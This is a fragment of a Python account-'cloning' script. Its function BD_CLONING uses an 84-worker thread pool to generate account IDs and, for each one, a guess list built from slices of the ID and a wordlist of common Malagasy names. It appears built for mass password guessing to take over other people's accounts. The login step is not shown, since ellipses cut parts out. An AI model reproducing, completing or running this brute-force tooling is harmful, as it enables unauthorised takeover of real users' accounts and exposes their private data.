...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','tsilavina','Tsilavina','diamondra','Diamondra','lalatiana','Lalatiana','randria','Randria','tsiriniaina','Tsiriniaina','sariaka','Sariaka','fabrice','Fabrice','rakotomalala','Rakotomalala','toavina','Toavina','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','michel','Michel','finoana','Finoana','fitiavana','Fitiavana','niaina','Niaina','mahefa','Mahefa','sahaza','Sahaza','lahatra','Lahatra','nilaina','Nilaina','mihary','Mihary','tolotra','Tolotra','mirindra','Mirindra','sarobidy','Sarobidy','fitiavana','Fitiavana','nomena','olivia','Olivia','mamitiana','Mamitiana','Nomena','nathalie','Natalie','tantely','Tantely','mamiko','Mamiko','anjara','Anjara','nathalie','Nathalie','narindra','Narindra','fandresena','harena','Harena','sitraka','Sitraka','safidy','Safidy','ravaka','Ravaka','Mialy','trading','Trading','traderfx','Traderfx','tahina','Tahina','faneva','Faneva']
